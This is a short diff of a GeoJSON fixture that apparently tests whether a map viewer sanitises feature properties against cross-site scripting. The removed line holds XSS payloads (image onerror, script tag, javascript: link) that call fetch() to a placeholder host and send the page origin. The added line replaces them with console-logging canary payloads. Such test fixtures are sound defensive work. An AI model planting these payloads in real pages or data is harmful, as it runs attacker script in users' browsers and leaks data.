@@ -1,3 +1,3 @@
 {"type":"FeatureCollection","features":[
-{"type":"Feature","properties":{"name":"<img src=x onerror=\"fetch('https://rsxss.invalid/geojson-name?o='+location.origin)\">","desc":"<script>fetch('https://rsxss.invalid/geojson-script?o='+location.origin)</script>","link":"javascript:fetch('https://rsxss.invalid/geojson-href')"},"geometry":{"type":"Point","coordinates":[0,0]}}
+{"type":"Feature","properties":{"v_img":"RSXCANARY<img src=x onerror=\"console.log('RSXFIRE:img:'+location.origin)\">","v_svg":"RSXCANARY<svg onload=\"console.log('RSXFIRE:svg:'+location.origin)\">","v_b":"RSXCANARY<b>bold</b>plain","v_href":"<a href=\"javascript:console.log('RSXFIRE:href')\">RSXCANARY-link</a>"},"geometry":{"type":"Point","coordinates":[0,0]}}
 ]}
